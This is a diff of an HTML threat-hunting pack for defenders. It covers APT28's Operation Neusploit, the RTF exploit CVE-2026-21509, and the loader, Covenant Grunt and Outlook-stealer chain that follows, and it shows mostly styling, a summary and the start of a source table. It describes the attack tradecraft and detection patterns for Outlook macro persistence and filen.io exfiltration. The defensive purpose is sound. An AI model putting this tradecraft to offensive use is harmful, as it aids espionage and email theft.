@@ -3,1203 +3,602 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>APT28 PRISMEX / Operation Neusploit — Hunt &amp; Hardening Pack (CrowdStrike CQL)</title>
+<title>APT28 PRISMEX / Operation Neusploit (CVE-2026-21509) — HuntPack v0.3</title>
 <style>
-  :root {
-    --bg: #0d1117;
-    --bg-2: #161b22;
-    --bg-3: #1c2230;
-    --border: #30363d;
-    --fg: #e6edf3;
-    --fg-dim: #9ca3af;
-    --fg-muted: #6e7681;
-    --accent: #ff5555;
-    --accent-2: #ff7a45;
-    --info: #58a6ff;
-    --good: #3fb950;
-    --warn: #d29922;
-    --crit: #f85149;
-    --purple: #b392f0;
-    --code-bg: #0a0e14;
-    --shadow: 0 1px 3px rgba(0,0,0,0.4);
-  }
-  * { box-sizing: border-box; }
-  body {
-    margin: 0;
-    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-    background: var(--bg);
-    color: var(--fg);
-    line-height: 1.6;
-    -webkit-font-smoothing: antialiased;
-  }
-  .container { max-width: 1180px; margin: 0 auto; padding: 0 24px; }
-
-  /* HERO */
-  .hero {
-    background: linear-gradient(135deg, #0e0a1a 0%, #14102a 50%, #0d1117 100%);
-    border-bottom: 1px solid var(--border);
-    padding: 40px 0 32px;
-  }
-  .hero h1 { margin: 0 0 8px; font-size: 2.2em; line-height: 1.15; color: var(--fg); }
-  .hero .subtitle { color: var(--fg-dim); font-size: 1.05em; margin-bottom: 16px; }
-  .badges { display: flex; flex-wrap: wrap; gap: 8px; margin-bottom: 18px; }
-  .badge {
-    display: inline-block; padding: 3px 10px; border-radius: 999px;
-    font-size: 0.78em; font-weight: 600; letter-spacing: 0.3px;
-    background: var(--bg-3); border: 1px solid var(--border); color: var(--fg-dim);
-  }
-  .badge.crit { background: rgba(248,81,73,0.15); color: var(--crit); border-color: rgba(248,81,73,0.4); }
-  .badge.warn { background: rgba(210,153,34,0.15); color: var(--warn); border-color: rgba(210,153,34,0.4); }
-  .badge.info { background: rgba(88,166,255,0.15); color: var(--info); border-color: rgba(88,166,255,0.4); }
-  .badge.good { background: rgba(63,185,80,0.15); color: var(--good); border-color: rgba(63,185,80,0.4); }
-  .badge.purple { background: rgba(179,146,240,0.15); color: var(--purple); border-color: rgba(179,146,240,0.4); }
-  .meta-row {
-    display: flex; flex-wrap: wrap; gap: 16px;
-    color: var(--fg-muted); font-size: 0.88em;
-    border-top: 1px solid var(--border); padding-top: 14px;
-  }
-  .meta-row span strong { color: var(--fg-dim); }
-
-  /* CLOUD SELECTOR */
-  .cloud-bar {
-    position: sticky; top: 0; z-index: 50;
-    background: rgba(13,17,23,0.92); backdrop-filter: blur(8px);
-    border-bottom: 1px solid var(--border); padding: 10px 0;
-  }
-  .cloud-bar-inner { display: flex; align-items: center; gap: 12px; flex-wrap: wrap; font-size: 0.9em; }
-  .cloud-bar label { color: var(--fg-dim); font-weight: 600; }
-  .cloud-bar select {
-    background: var(--bg-2); color: var(--fg); border: 1px solid var(--border);
-    border-radius: 6px; padding: 6px 10px; font-size: 0.95em; font-family: inherit; cursor: pointer;
-  }
-  .cloud-bar select:focus { outline: 2px solid var(--info); outline-offset: 1px; }
-  .cloud-bar .current-host {
-    font-family: "JetBrains Mono", "Fira Code", "Cascadia Code", Consolas, monospace;
-    color: var(--info); font-size: 0.85em; padding: 4px 8px;
-    background: var(--bg-2); border-radius: 4px; border: 1px solid var(--border);
-  }
-  .cloud-bar .hint { color: var(--fg-muted); font-size: 0.82em; margin-left: auto; }
-
-  /* SECTIONS */
-  section { padding: 36px 0; border-bottom: 1px solid var(--border); }
-  section:last-of-type { border-bottom: none; }
-  h2 { font-size: 1.55em; margin: 0 0 16px; color: var(--fg); border-bottom: 2px solid var(--accent); display: inline-block; padding-bottom: 4px; }
-  h3 { font-size: 1.15em; margin: 24px 0 10px; color: var(--fg); }
-  h4 { font-size: 1.0em; margin: 18px 0 8px; color: var(--fg-dim); text-transform: uppercase; letter-spacing: 0.5px; font-weight: 600; }
-  p { margin: 8px 0 14px; }
-  a { color: var(--info); }
-  a:hover { color: var(--accent-2); }
-
-  /* TOC */
-  .toc { background: var(--bg-2); border: 1px solid var(--border); border-radius: 8px; padding: 18px 22px; margin: 24px 0; }
-  .toc h3 { margin: 0 0 10px; font-size: 1em; text-transform: uppercase; letter-spacing: 0.6px; color: var(--fg-dim); }
-  .toc-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 4px 16px; }
-  .toc a { color: var(--info); text-decoration: none; padding: 4px 0; display: block; font-size: 0.92em; }
-  .toc a:hover { color: var(--accent-2); }
-
-  /* TABLES */
-  table {
-    width: 100%; border-collapse: collapse; background: var(--bg-2);
-    border: 1px solid var(--border); border-radius: 6px; overflow: hidden;
-    margin: 14px 0; font-size: 0.92em;
-  }
-  th { background: var(--bg-3); padding: 9px 12px; text-align: left; font-weight: 600; color: var(--fg); border-bottom: 1px solid var(--border); }
-  td { padding: 9px 12px; border-bottom: 1px solid var(--border); vertical-align: top; color: var(--fg-dim); }
-  tr:last-child td { border-bottom: none; }
-  td code, th code { background: var(--code-bg); padding: 1px 6px; border-radius: 3px; color: var(--accent-2); font-size: 0.92em; }
-
-  /* CARDS */
-  .card-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 14px; margin: 16px 0; }
-  .card { background: var(--bg-2); border: 1px solid var(--border); border-left: 3px solid var(--accent); border-radius: 6px; padding: 14px 16px; }
-  .card .num { font-size: 1.8em; font-weight: 700; color: var(--accent); }
-  .card .lbl { color: var(--fg-muted); font-size: 0.85em; text-transform: uppercase; letter-spacing: 0.5px; }
-
-  /* QUERY CARDS */
-  .query { background: var(--bg-2); border: 1px solid var(--border); border-radius: 8px; margin: 22px 0; overflow: hidden; }
-  .query-head { display: flex; align-items: center; justify-content: space-between; background: var(--bg-3); padding: 12px 16px; border-bottom: 1px solid var(--border); gap: 12px; flex-wrap: wrap; }
-  .query-title { display: flex; align-items: center; gap: 10px; font-weight: 600; color: var(--fg); }
-  .query-title .qid { background: var(--accent); color: #1a0e0e; font-weight: 700; padding: 2px 8px; border-radius: 4px; font-size: 0.78em; }
-  .query-meta { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 6px 18px; padding: 10px 16px; font-size: 0.85em; color: var(--fg-dim); border-bottom: 1px solid var(--border); background: rgba(0,0,0,0.18); }
-  .query-meta strong { color: var(--fg); font-weight: 600; }
-  .query-body { padding: 14px 16px; }
-  .query-body p { margin: 4px 0 10px; color: var(--fg-dim); font-size: 0.93em; }
-  .query-body p strong { color: var(--fg); }
-
-  pre {
-    background: var(--code-bg); border: 1px solid var(--border); border-left: 3px solid var(--accent);
-    border-radius: 6px; padding: 14px 16px; overflow-x: auto;
-    font-family: "JetBrains Mono", "Fira Code", "Cascadia Code", Consolas, monospace;
-    font-size: 0.86em; line-height: 1.55; color: #c9d1d9; margin: 8px 0; position: relative;
-  }
-  pre code { color: inherit; background: none; padding: 0; }
-
-  /* CODE BLOCK ACTIONS */
-  .code-wrap { position: relative; display: flex; flex-direction: column; }
-  .code-actions { display: flex; gap: 8px; margin: 10px 0 0; flex-wrap: wrap; order: 2; }
-  .btn {
-    background: var(--bg-3); color: var(--fg); border: 1px solid var(--border);
-    padding: 5px 12px; border-radius: 5px; font-size: 0.78em; font-weight: 600;
-    cursor: pointer; font-family: inherit; transition: all 0.15s ease; text-decoration: none;
-    display: inline-flex; align-items: center; gap: 6px; white-space: nowrap;
-  }
-  .btn:hover { background: var(--accent); color: #1a0e0e; border-color: var(--accent); }
-  .btn.copied { background: var(--good); color: #0d1117; border-color: var(--good); }
-  .btn.open-falcon { background: rgba(88,166,255,0.12); border-color: rgba(88,166,255,0.4); color: var(--info); }
-  .btn.open-falcon:hover { background: var(--info); color: #0d1117; }
-  .code-actions .btn { padding: 7px 14px; font-size: 0.82em; }
-  .code-actions .btn .btn-icon { font-family: monospace; opacity: 0.9; }
-  .code-actions .btn.open-falcon { background: var(--accent); color: #1a0e0e; border-color: var(--accent); }
-  .code-actions .btn.open-falcon:hover { background: var(--accent-2); color: #fff; border-color: var(--accent-2); }
-
-  /* CALLOUTS */
-  .callout { padding: 12px 16px; border-radius: 6px; margin: 14px 0; border-left: 3px solid var(--info); background: rgba(88,166,255,0.06); color: var(--fg-dim); font-size: 0.93em; }
-  .callout-warn { border-left-color: var(--warn); background: rgba(210,153,34,0.06); }
-  .callout-crit { border-left-color: var(--crit); background: rgba(248,81,73,0.06); }
-  .callout-good { border-left-color: var(--good); background: rgba(63,185,80,0.06); }
-  .callout strong { color: var(--fg); }
-
-  /* HARDENING TIERS */
-  .tier {
-    background: var(--bg-2); border: 1px solid var(--border); border-radius: 8px;
-    padding: 18px 22px; margin: 18px 0;
-  }
-  .tier.tier-immediate { border-left: 4px solid var(--crit); }
-  .tier.tier-short { border-left: 4px solid var(--warn); }
-  .tier.tier-strategic { border-left: 4px solid var(--info); }
-  .tier h3 { margin-top: 0; display: flex; align-items: center; gap: 10px; }
-  .tier h3 .tier-label { font-size: 0.7em; padding: 3px 9px; border-radius: 4px; text-transform: uppercase; letter-spacing: 0.5px; font-weight: 700; }
-  .tier-immediate h3 .tier-label { background: rgba(248,81,73,0.18); color: var(--crit); border: 1px solid rgba(248,81,73,0.4); }
-  .tier-short h3 .tier-label { background: rgba(210,153,34,0.18); color: var(--warn); border: 1px solid rgba(210,153,34,0.4); }
-  .tier-strategic h3 .tier-label { background: rgba(88,166,255,0.18); color: var(--info); border: 1px solid rgba(88,166,255,0.4); }
-  .tier ul li { margin: 6px 0; }
-  .tier .fw { font-size: 0.82em; color: var(--fg-muted); display: block; margin-top: 2px; padding-left: 4px; }
-
-  /* COVERAGE CELLS */
-  .cov-good { color: var(--good); font-weight: 600; }
-  .cov-partial { color: var(--warn); font-weight: 600; }
-  .cov-gap { color: var(--crit); font-weight: 700; }
-
-  /* FOOTER */
-  footer {
-    padding: 28px 0; text-align: center; color: var(--fg-muted); font-size: 0.85em;
-    border-top: 1px solid var(--border); background: var(--bg-2);
-  }
-
-  /* PRINT */
-  @media print {
-    body { background: #fff; color: #111; }
-    .hero { background: #f4f4f4; color: #111; }
-    .hero h1, .hero .subtitle, .meta-row { color: #111 !important; }
-    .cloud-bar, .code-actions, .btn.open-falcon { display: none !important; }
-    section, .card, .query, .toc, table, .tier { page-break-inside: avoid; }
-    pre, code { background: #f6f8fa !important; color: #24292f !important; border-color: #d0d7de !important; }
-    a { color: #0969da !important; text-decoration: underline; }
-    table { background: #fff; }
-    th, td { color: #111 !important; border-color: #d0d7de !important; }
-    th { background: #f6f8fa !important; }
-    .badge { background: #f6f8fa !important; color: #24292f !important; border-color: #d0d7de !important; }
-  }
+:root {
+  --bg: #0d1117; --surface: #1a1010; --surface2: #2a1515; --border: #30363d;
+  --text: #e6edf3; --text-muted: #9ca3af; --accent: #ff7b72; --accent-dim: rgba(255,123,114,0.13);
+  --red: #f85149; --yellow: #d29922; --green: #7ee787; --purple: #d2a8ff; --blue: #58a6ff;
+}
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { background: var(--bg); color: var(--text); font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; font-size: 14px; line-height: 1.6; }
+#sidebar { position: fixed; top: 0; left: 0; width: 210px; height: 100vh; background: var(--surface); border-right: 1px solid var(--border); overflow-y: auto; z-index: 100; transition: transform 0.2s ease; }
+.sidebar-logo { padding: 14px 14px 12px; border-bottom: 1px solid var(--border); }
+.sidebar-logo .brand { font-size: 10px; text-transform: uppercase; letter-spacing: 0.1em; color: var(--accent); font-weight: 700; }
+.sidebar-logo .pack-name { font-size: 12px; color: var(--text); font-weight: 600; margin-top: 3px; line-height: 1.3; }
+.sidebar-logo .version { font-size: 10px; color: var(--text-muted); margin-top: 2px; }
+#sidebar nav { padding: 8px 0; }
+#sidebar nav a { display: block; padding: 4px 14px 4px 16px; color: var(--text-muted); text-decoration: none; font-size: 11.5px; border-left: 2px solid transparent; transition: all 0.12s; }
+#sidebar nav a:hover, #sidebar nav a.active { color: var(--accent); background: var(--accent-dim); border-left-color: var(--accent); }
+#sidebar nav .nav-section { padding: 10px 14px 3px; font-size: 9px; text-transform: uppercase; letter-spacing: 0.1em; color: #6b4a48; font-weight: 700; }
+#toc-toggle { position: fixed; top: 10px; left: 172px; z-index: 200; background: var(--surface2); color: var(--accent); border: 1px solid var(--accent); border-radius: 5px; padding: 4px 9px; font-size: 13px; line-height: 1; cursor: pointer; transition: left 0.2s ease; font-family: inherit; }
+#toc-toggle:hover { background: var(--accent-dim); }
+#main { margin-left: 210px; padding: 24px 28px 80px; max-width: 1060px; transition: margin-left 0.2s ease; }
+body.toc-collapsed #sidebar { transform: translateX(-100%); }
+body.toc-collapsed #main { margin-left: 0; }
+body.toc-collapsed #toc-toggle { left: 10px; }
+@media (max-width: 768px) { #sidebar { transform: translateX(-100%); } #main { margin-left: 0; } #toc-toggle { left: 10px; } body.toc-shown #sidebar { transform: translateX(0); } }
+.hp-header { background: linear-gradient(140deg, #2a1410 0%, var(--surface) 60%); border: 1px solid var(--accent); border-radius: 8px; padding: 22px 24px; margin-bottom: 24px; }
+.hp-header h1 { font-size: 20px; color: var(--accent); font-weight: 700; letter-spacing: -0.01em; }
+.hp-header .subtitle { font-size: 12px; color: var(--text-muted); margin-top: 3px; margin-bottom: 14px; }
+.meta-grid { display: flex; flex-wrap: wrap; gap: 18px; }
+.meta-item .mk { font-size: 9px; text-transform: uppercase; letter-spacing: 0.08em; color: var(--text-muted); }
+.meta-item .mv { font-size: 12px; color: var(--text); font-weight: 600; }
+.section { margin-bottom: 28px; scroll-margin-top: 16px; }
+.section-hdr { display: flex; align-items: center; gap: 8px; padding: 9px 14px; background: var(--surface); border: 1px solid var(--border); border-radius: 6px 6px 0 0; }
+.section-hdr h2 { font-size: 13px; font-weight: 600; color: var(--text); }
+.snum { font-size: 10px; color: var(--accent); font-weight: 700; background: var(--accent-dim); padding: 1px 6px; border-radius: 3px; }
+.section-body { background: var(--surface); border: 1px solid var(--border); border-top: none; border-radius: 0 0 6px 6px; padding: 16px; }
+table { width: 100%; border-collapse: collapse; font-size: 12px; }
+th { background: var(--surface2); color: var(--text-muted); text-transform: uppercase; font-size: 9.5px; letter-spacing: 0.06em; padding: 6px 10px; text-align: left; border-bottom: 1px solid var(--border); white-space: nowrap; }
+td { padding: 6px 10px; border-bottom: 1px solid var(--border); vertical-align: top; line-height: 1.5; }
+tr:last-child td { border-bottom: none; }
+tr:hover td { background: var(--surface2); }
+.badge { display: inline-block; padding: 1px 6px; border-radius: 3px; font-size: 9.5px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.04em; }
+.b-high { background: rgba(248,81,73,0.18); color: #f85149; }
+.b-med { background: rgba(210,153,34,0.18); color: #d29922; }
+.b-low { background: rgba(126,231,135,0.18); color: #7ee787; }
+.b-crit { background: rgba(248,81,73,0.28); color: #ff7b72; border: 1px solid #f85149; }
+.b-info { background: rgba(88,166,255,0.15); color: #58a6ff; }
+.b-purple { background: rgba(210,168,255,0.15); color: #d2a8ff; }
+.cloud-sel { display: flex; align-items: center; gap: 8px; padding: 7px 12px; background: var(--surface); border: 1px solid var(--accent); border-radius: 6px; font-size: 11px; margin-bottom: 14px; }
+.cloud-sel label { color: var(--text-muted); }
+.cloud-sel select { background: var(--surface2); color: var(--text); border: 1px solid var(--border); border-radius: 4px; padding: 2px 7px; font-size: 11px; cursor: pointer; font-family: inherit; }
+.query-card { background: var(--surface2); border: 1px solid var(--border); border-radius: 6px; margin-bottom: 14px; overflow: hidden; }
+.qc-header { display: flex; align-items: center; justify-content: space-between; padding: 9px 12px; background: var(--accent-dim); border-bottom: 1px solid var(--border); flex-wrap: wrap; gap: 8px; }
+.qc-title { font-size: 12.5px; font-weight: 600; color: var(--text); }
+.qc-badges { display: flex; gap: 5px; flex-wrap: wrap; }
+.qc-actions { display: flex; gap: 6px; }
+.qc-actions button { padding: 3px 9px; border-radius: 4px; font-size: 10.5px; font-weight: 600; cursor: pointer; border: 1px solid; transition: all 0.12s; font-family: inherit; }
+.btn-copy { background: var(--accent-dim); color: var(--accent); border-color: var(--accent); }
+.btn-copy.copied { background: rgba(126,231,135,0.18); color: #7ee787; border-color: #7ee787; }
+.btn-falcon { background: rgba(88,166,255,0.1); color: #58a6ff; border-color: rgba(88,166,255,0.5); }
+.btn-falcon:hover { background: rgba(88,166,255,0.22); }
+.qc-body { padding: 12px; }
+pre.cql { background: #010409; border: 1px solid var(--border); border-radius: 4px; padding: 10px 12px; font-family: 'Cascadia Code','Fira Code','Consolas',monospace; font-size: 11px; line-height: 1.55; overflow-x: auto; color: #e6edf3; }
+.cm { color: #8b949e; font-style: italic; }
+pre.code { background: #010409; border: 1px solid var(--border); border-radius: 4px; padding: 10px 12px; font-family: 'Cascadia Code','Consolas',monospace; font-size: 11px; line-height: 1.5; overflow-x: auto; color: #e6edf3; margin: 6px 0; white-space: pre; }
+.mono { font-family: 'Cascadia Code','Consolas',monospace; font-size: 11.5px; color: var(--accent); }
+.ioc-grab-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(330px, 1fr)); gap: 12px; margin: 10px 0 4px; }
+.ioc-grab { background: var(--surface2); border: 1px solid var(--border); border-radius: 6px; padding: 10px 12px; }
+.ioc-grab .igh { display: flex; align-items: center; justify-content: space-between; gap: 8px; margin-bottom: 6px; }
+.ioc-grab .igh .igt { font-size: 12px; font-weight: 600; color: var(--text); }
+.ioc-grab .igh .igc { font-size: 10px; color: var(--text-muted); white-space: nowrap; }
+.ioc-grab pre.code { margin: 0; max-height: 260px; }
+.tier-blk { border: 1px solid var(--border); border-radius: 6px; padding: 11px 13px; margin-bottom: 10px; background: var(--surface2); }
+.tier-imm { border-left: 3px solid #f85149; } .tier-near { border-left: 3px solid #d29922; } .tier-strat { border-left: 3px solid #58a6ff; }
+.tier-lbl { font-size: 9.5px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.07em; margin-bottom: 5px; }
+.tier-imm .tier-lbl { color: #f85149; } .tier-near .tier-lbl { color: #d29922; } .tier-strat .tier-lbl { color: #58a6ff; }
+.tier-blk ul { padding-left: 18px; } .tier-blk h4 { font-size: 12.5px; color: var(--text); margin: 2px 0 4px; }
+.callout { display: block; padding: 9px 12px; border-radius: 5px; margin: 8px 0; font-size: 12px; line-height: 1.5; }
+.callout-warn { background: rgba(210,153,34,0.1); border: 1px solid rgba(210,153,34,0.35); color: #d29922; }
+.callout-info { background: rgba(88,166,255,0.09); border: 1px solid rgba(88,166,255,0.3); color: #58a6ff; }
+.callout-danger { background: rgba(248,81,73,0.09); border: 1px solid rgba(248,81,73,0.3); color: #f85149; }
+.ticket { background: var(--surface2); border: 1px solid var(--border); border-radius: 6px; padding: 14px; }
+.chg-entry { display: flex; gap: 10px; padding: 8px 0; border-bottom: 1px solid var(--border); font-size: 12px; }
+.chg-entry:last-child { border-bottom: none; }
+.chg-ver { color: var(--accent); min-width: 40px; font-weight: 700; } .chg-date { color: var(--text-muted); min-width: 88px; }
+p { margin-bottom: 7px; font-size: 13px; } ul, ol { padding-left: 18px; margin: 6px 0; } li { font-size: 12.5px; margin-bottom: 3px; }
+a { color: var(--accent); text-decoration: none; } a:hover { text-decoration: underline; }
+h3 { font-size: 12.5px; font-weight: 700; margin: 13px 0 7px; color: var(--text); } h4 { font-size: 12px; font-weight: 600; margin: 9px 0 5px; color: var(--text-muted); }
+code { background: var(--surface2); border: 1px solid var(--border); border-radius: 3px; padding: 0 4px; font-family: 'Cascadia Code','Consolas',monospace; font-size: 11px; color: var(--accent); }
 </style>
 </head>
 <body>
 
-<!-- HERO -->
-<header class="hero">
-  <div class="container">
-    <div class="badges">
-      <span class="badge crit">ACTIVELY EXPLOITED</span>
-      <span class="badge crit">NATION-STATE (APT28)</span>
-      <span class="badge purple">MULTI-STAGE CHAIN</span>
-      <span class="badge warn">CLOUD-NATIVE C2 (filen.io)</span>
-      <span class="badge info">EU DEFENSE / UKRAINE</span>
-      <span class="badge info">TTP-DRIVEN HUNT</span>
-    </div>
-    <h1>APT28 PRISMEX / Operation Neusploit — Hunt &amp; Hardening Pack</h1>
-    <div class="subtitle">CVE-2026-21509 (Office RTF RCE) → PrismexLoader / PixyNetLoader → CovenantGrunt over filen.io. NotDoor Outlook backdoor for long-haul persistence. Switchable Falcon cloud for shareable deep-links.</div>
-    <div class="meta-row">
-      <span><strong>Generated:</strong> 2026-05-16</span>
-      <span><strong>Skills used:</strong> threat-hunter + crowdstrike-logscale + threat-hardening</span>
-      <span><strong>Reporting basis:</strong> Trend Micro / Trellix / Zscaler / Splunk Threat Research</span>
-      <span><strong>Detection mode:</strong> Detect-first; review before promoting to Prevent</span>
-    </div>
+<button id="toc-toggle" onclick="toggleToc()" title="Show / hide table of contents" aria-label="Show or hide table of contents">☰</button>
+
+<nav id="sidebar">
+  <div class="sidebar-logo">
+    <div class="brand">HUNTPACK</div>
+    <div class="pack-name">APT28 PRISMEX<br>Operation Neusploit</div>
+    <div class="version">v0.3 · 2026-06-12</div>
   </div>
-</header>
+  <nav>
+    <div class="nav-section">Overview</div>
+    <a href="#s1">1 · Executive Summary</a>
+    <a href="#s2">2 · Source Review</a>
+    <a href="#s3">3 · Hunt Brief &amp; Chain</a>
+    <a href="#s4">4 · IOC Table</a>
+    <a href="#s5">5 · ATT&amp;CK Mapping</a>
+    <div class="nav-section">Detection</div>
+    <a href="#s6">6 · Native Hunts</a>
+    <a href="#s7">7 · CQL Queries</a>
+    <a href="#s8">8 · Custom IOA Recs</a>
+    <a href="#s9">9 · IOC Quick-Copy</a>
+    <div class="nav-section">Response</div>
+    <a href="#s10">10 · Hardening</a>
+    <a href="#s11">11 · Containment</a>
+    <div class="nav-section">Meta</div>
+    <a href="#s12">12 · Coverage &amp; Validation</a>
+    <a href="#s13">13 · Hunt Ticket</a>
+    <a href="#s14">14 · Changelog</a>
+    <a href="#s15">15 · References</a>
+  </nav>
+</nav>
 
-<!-- CLOUD SELECTOR -->
-<div class="cloud-bar">
-  <div class="container cloud-bar-inner">
-    <label for="cloudSelect">Falcon Cloud:</label>
-    <select id="cloudSelect" onchange="updateCloud()">
-      <option value="https://falcon.crowdstrike.com">US-1 — falcon.crowdstrike.com</option>
-      <option value="https://falcon.us-2.crowdstrike.com">US-2 — falcon.us-2.crowdstrike.com</option>
-      <option value="https://falcon.eu-1.crowdstrike.com">EU-1 — falcon.eu-1.crowdstrike.com</option>
-      <option value="https://falcon.laggar.gcw.crowdstrike.com">US-GOV-1 — falcon.laggar.gcw.crowdstrike.com</option>
-      <option value="https://falcon.us-gov-2.crowdstrike.com">US-GOV-2 — falcon.us-gov-2.crowdstrike.com</option>
-    </select>
-    <span class="current-host" id="currentHost">https://falcon.crowdstrike.com</span>
-    <span class="hint">Selection persists per browser. Open-in-Falcon buttons update live.</span>
-  </div>
-</div>
+<div id="main">
 
-<div class="container">
-
-<!-- TOC -->
-<div class="toc">
-  <h3>Contents</h3>
-  <div class="toc-grid">
-    <a href="#summary">1. Executive Summary</a>
-    <a href="#brief">2. Hunt Brief</a>
-    <a href="#mitre">3. MITRE ATT&amp;CK Mapping</a>
-    <a href="#queries">4. CQL Hunt Queries (8)</a>
-    <a href="#iocs">5. IOC Blocklist Template</a>
-    <a href="#ioa">6. Custom IOA Recommendations</a>
-    <a href="#hardening">7. Hardening Recommendations</a>
-    <a href="#coverage">8. Detection Coverage Map</a>
-    <a href="#ticket">9. Hunt Summary Ticket</a>
-    <a href="#refs">10. References</a>
+<div class="hp-header">
+  <h1>APT28 PRISMEX — Operation Neusploit (CVE-2026-21509)</h1>
+  <div class="subtitle">Russia's APT28 (Fancy Bear) exploits a Microsoft Office RTF security-feature-bypass (CVE-2026-21509) in phishing against Central/Eastern European &amp; Ukrainian government targets. The RTF drops <strong>MiniDoor</strong> (an Outlook email stealer, a stripped NotDoor variant) and <strong>PixyNetLoader</strong>, which deploys a <strong>Covenant Grunt</strong> implant. Defensive hunt &amp; harden pack — no offensive code.</div>
+  <div class="meta-grid">
+    <div class="meta-item"><div class="mk">Threat</div><div class="mv">APT28 / Fancy Bear · Operation Neusploit</div></div>
+    <div class="meta-item"><div class="mk">Severity</div><div class="mv"><span class="badge b-crit">NATION-STATE · EXPLOITED ITW</span></div></div>
+    <div class="meta-item"><div class="mk">Type</div><div class="mv">State espionage · Office RTF exploit · email theft</div></div>
+    <div class="meta-item"><div class="mk">CVE</div><div class="mv">CVE-2026-21509 (Office RTF) · patched 26 Jan 2026 (OOB)</div></div>
+    <div class="meta-item"><div class="mk">Payloads</div><div class="mv">MiniDoor (NotDoor variant) · PixyNetLoader · Covenant Grunt</div></div>
+    <div class="meta-item"><div class="mk">Version</div><div class="mv">v0.3 · 2026-06-12</div></div>
+    <div class="meta-item"><div class="mk">Author</div><div class="mv">HuntPack</div></div>
   </div>
 </div>
 
-<!-- EXECUTIVE SUMMARY -->
-<section id="summary">
-  <h2>Executive Summary</h2>
-  <p>
-    <strong>APT28</strong> (aka Fancy Bear, Forest Blizzard, Pawn Storm, UAC-0001 — Russian GRU Unit 26165) is running an active espionage campaign codenamed <strong>PRISMEX</strong> (Trend Micro) / <strong>Operation Neusploit</strong> (Zscaler) against Ukrainian government bodies and NATO allies' defense, transport, and logistics organizations across Poland, Slovenia, Turkey, Romania, the Czech Republic, Slovakia, the UAE, and Greece. The chain is notable for two operational traits: <strong>24-hour weaponization</strong> of a Microsoft Office 1-day (CVE-2026-21509), and <strong>cloud-native C2 over filen.io</strong> — a legitimate end-to-end encrypted storage service — which bypasses reputation-based proxy filtering by blending with normal HTTPS traffic to a benign provider.
-  </p>
-  <p>
-    The multi-stage chain begins with a spear-phishing RTF that triggers CVE-2026-21509 to drop <strong>PrismexLoader (PixyNetLoader)</strong>, which uses PNG steganography (a "Bit Plane Round Robin" algorithm) to reconstruct an in-memory <strong>.NET CovenantGrunt implant (PrismexStager)</strong>. The stager polls 24 filen.io subdomains for encrypted task files (AES-256-GCM, HMAC-SHA256), executes them via reflective .NET assembly loading or PowerShell, and streams output back. A separate Outlook-resident backdoor — <strong>NotDoor</strong> — is dropped via DLL sideloading through a legitimate OneDrive.exe binary in <code>C:\ProgramData</code>, persisting as a VBA macro at <code>%APPDATA%\Microsoft\Outlook\VbaProject.OTM</code>. Some incidents have also included a destructive wiper component that erases <code>%USERPROFILE%</code>.
-  </p>
-  <div class="card-grid">
-    <div class="card"><div class="num">~24h</div><div class="lbl">Weaponization of disclosed CVE</div></div>
-    <div class="card"><div class="num">24</div><div class="lbl">filen.io subdomains for C2</div></div>
-    <div class="card"><div class="num">8</div><div class="lbl">CQL hunt queries in this pack</div></div>
-    <div class="card"><div class="num">17</div><div class="lbl">Hardening controls (3 tiers)</div></div>
+<div class="section" id="s1">
+  <div class="section-hdr"><span class="snum">01</span><h2>Executive Summary</h2></div>
+  <div class="section-body">
+    <p>Operation Neusploit (Zscaler ThreatLabz, Jan 2026) is an APT28 (Fancy Bear, Russia GRU) espionage campaign exploiting <strong>CVE-2026-21509</strong>, a security-feature-bypass in how Microsoft Office handles <strong>RTF</strong> files (affects Office 2016/2019, LTSC 2021/2024, and M365 Apps; Microsoft shipped an out-of-band fix on 26 Jan 2026). APT28 sends crafted RTF/Word documents in phishing emails; CERT-UA reported abuse against 60+ central-government addresses in Ukraine.</p>
+    <p>The exploited document delivers a dropper that deploys <strong>MiniDoor</strong> — an Outlook email stealer assessed to be a stripped variant of the APT28-linked <strong>NotDoor</strong> Outlook backdoor — and <strong>PixyNetLoader</strong> (the "PRISMEX" loader), which in turn loads a <strong>Covenant Grunt</strong> implant for hands-on C2 (observed using <code>filen.io</code> for staging/exfil). Because the actor abuses Office and a known C2 framework, detection centers on the <strong>Office-document exploit lineage</strong>, the <strong>Outlook-stealer behavior</strong>, and the <strong>loader → Covenant Grunt</strong> chain.</p>
+    <div class="callout callout-danger">⚠ <strong>Defender priority:</strong> Patch CVE-2026-21509 (the OOB fix) — that closes the exploit. Until verified, hunt <strong>Q1</strong> (Office app — esp. opening an RTF — spawning a dropper/child), <strong>Q3</strong> (MiniDoor Outlook-stealer persistence/registry), and <strong>Q4</strong> (PixyNetLoader → Covenant Grunt). Treat any hit as a nation-state intrusion against high-value/government users.</p>
   </div>
-  <div class="callout callout-crit">
-    <strong>Highest-fidelity single-pane detection:</strong> <strong>Q2</strong> — <code>VbaProject.OTM</code> file creation by any process other than <code>OUTLOOK.EXE</code> in <code>%APPDATA%\Microsoft\Outlook\</code>. This file is only ever written by Outlook during legitimate macro authoring (which most enterprises don't allow). Any other writer is almost certainly NotDoor or an analogous Outlook-macro persistence implant. <strong>Q1</strong> (outlook.exe spawning script interpreters) and <strong>Q5</strong> (outbound TLS to <code>*.filen.io</code> from non-browser processes) are the next-best signals and cover the live-execution and C2 halves of the chain.
+</div>
+
+<div class="section" id="s2">
+  <div class="section-hdr"><span class="snum">02</span><h2>Source Review &amp; Web Hunter Notes</h2></div>
+  <div class="section-body">
+    <table>
+      <thead><tr><th>Tier</th><th>Source</th><th>Key Finding</th><th>Carry</th></tr></thead>
+      <tbody>
+        <tr><td>1 · Vendor research</td><td>Zscaler ThreatLabz — Operation Neusploit</td><td>APT28 + CVE-2026-21509; MiniDoor/PixyNetLoader/Covenant Grunt; CEE/Ukraine targeting</td><td><span class="badge b-low">yes</span></td></tr>
